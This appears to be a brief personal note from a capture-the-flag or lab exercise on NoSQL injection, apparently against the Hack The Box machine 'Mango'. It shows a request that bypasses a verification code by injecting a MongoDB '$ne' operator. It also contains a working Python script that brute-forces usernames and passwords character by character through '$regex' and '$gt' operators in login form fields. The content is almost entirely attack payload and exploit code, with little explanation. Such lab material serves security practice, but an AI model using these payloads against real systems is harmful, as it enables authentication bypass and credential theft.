![[nosql databases.png]]

> NOSQL INJECTION $NE
```shell
#REQ ORIGINAL
{
	"email":"test@test.com",
	"code":"1234"
}
Response: Invalid Code.

#REQ CON INJECCIÓN
{
	"email":"test@test.com",
	"code":{
	"$ne":"1234"
	}
}
Response: Email Verified
```


> SCRIPT
```python
import string
import sys
import requests

def brute_password(user):
    password = ""
    while True:
        for c in string.ascii_letters + string.digits + string.punctuation:
            if c in ["*", "+", ".", "?", "|", "\\"]:
                continue
            sys.stdout.write(f"\r[+] Password: {password}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://staging-order.mango.htb/",
                data={
                    "username": user,
                    "password[$regex]": f"^{password}{c}.*",
                    "login": "login",
                },
            )
            if "We just started farming!" in resp.text:
                password += c
                resp = requests.post(
                    "http://staging-order.mango.htb/",
                    data={"username": user, "password": password, "login": "login"},
                )
                if "We just started farming!" in resp.text:
                    print(f"\r[+] Found password for {user}: {password.ljust(20)}")
                    return
                break


def brute_user(res):
    found = False
    for c in string.ascii_letters + string.digits:
        sys.stdout.write(f"\r[*] Trying Username: {res}{c.ljust(20)}")
        sys.stdout.flush()
        resp = requests.post(
            "http://staging-order.mango.htb/",
            data={
                "username[$regex]": f"^{res}{c}",
                "password[$gt]": "",
                "login": "login",
            },
        )
        if "We just started farming!" in resp.text:
            found = True
            brute_user(res + c)
    if not found:
        print(f"\r[+] Found user: {res.ljust(20)}")
        brute_password(res)

brute_user("")
```